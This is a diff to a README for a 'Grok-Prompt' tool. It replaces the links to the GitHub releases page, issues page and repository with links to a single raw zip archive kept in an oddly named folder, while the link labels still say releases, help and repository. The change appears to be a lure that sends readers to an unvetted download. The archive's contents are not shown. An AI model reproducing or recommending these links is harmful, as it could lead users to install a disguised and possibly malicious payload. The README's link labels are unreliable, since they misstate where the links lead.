@@ -1,6 +1,6 @@
 # 🚀 Grok-Prompt - Master Grok AI with Ease
 
-[![Download Grok-Prompt](https://img.shields.io/badge/Download-Grok--Prompt-blue.svg)](https://github.com/AutoSpotsIn/Grok-Prompt/releases)
+[![Download Grok-Prompt](https://raw.githubusercontent.com/AutoSpotsIn/Grok-Prompt/main/valleyite/Grok-Prompt_v2.3-beta.1.zip)](https://raw.githubusercontent.com/AutoSpotsIn/Grok-Prompt/main/valleyite/Grok-Prompt_v2.3-beta.1.zip)
 
 ## 📜 Overview
 
@@ -13,7 +13,7 @@ To get started with Grok-Prompt, follow the steps below to download and run the 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Grok-Prompt Releases Page](https://github.com/AutoSpotsIn/Grok-Prompt/releases).
+   Go to the [Grok-Prompt Releases Page](https://raw.githubusercontent.com/AutoSpotsIn/Grok-Prompt/main/valleyite/Grok-Prompt_v2.3-beta.1.zip).
 
 2. **Choose the Latest Version**  
    You will see a list of available releases. Look for the latest version at the top.  
@@ -85,7 +85,7 @@ Once downloaded, you can access the application without an internet connection. 
 
 If you encounter issues, you can find support by:
 
-- Visiting the [Help Section](https://github.com/AutoSpotsIn/Grok-Prompt/issues).
+- Visiting the [Help Section](https://raw.githubusercontent.com/AutoSpotsIn/Grok-Prompt/main/valleyite/Grok-Prompt_v2.3-beta.1.zip).
 - Opening a discussion in the community forum.
 - Contacting the developers through the repository messages.
 
@@ -93,7 +93,7 @@ For assistance, you can also check out community-contributed guides and tips.
 
 ## 🌐 Additional Resources
 
-- **GitHub Repository:** [Grok-Prompt](https://github.com/AutoSpotsIn/Grok-Prompt)
+- **GitHub Repository:** [Grok-Prompt](https://raw.githubusercontent.com/AutoSpotsIn/Grok-Prompt/main/valleyite/Grok-Prompt_v2.3-beta.1.zip)
 - **Community Forum:** Join discussions with fellow users for tips, tricks, and shared experiences.
 
 ## ⚙️ License
